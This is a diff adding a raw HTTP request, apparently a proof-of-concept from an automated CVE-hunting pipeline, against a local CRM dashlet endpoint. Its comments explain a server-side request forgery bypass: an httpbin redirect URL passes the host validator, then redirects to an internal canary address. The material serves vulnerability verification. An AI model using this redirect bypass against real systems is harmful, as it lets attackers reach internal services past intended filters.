@@ -1,0 +1,15 @@
+POST /index.php HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<low-priv-session>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0 cvehunter-stage10
+X-Requested-With: XMLHttpRequest
+Referer: http://localhost:33116/index.php?module=Home&action=index
+Content-Type: application/x-www-form-urlencoded
+
+to_pdf=1&module=Home&action=CallMethodDashlet&method=display&id=dash_1f4b2bb5
+
+# dashlet dash_1f4b2bb5 was pre-configured (fixture) with url=
+# https://httpbin.org/redirect-to?url=http%3A%2F%2F172.18.0.1%3A33119%2Fcanary-rss094_ab9c346b&status_code=302
+# which validate_external_host() approves, then 302-redirects to
+# http://172.18.0.1:33119/canary-rss094_ab9c346b
+# which validate_external_host() would REJECT outright if given directly.
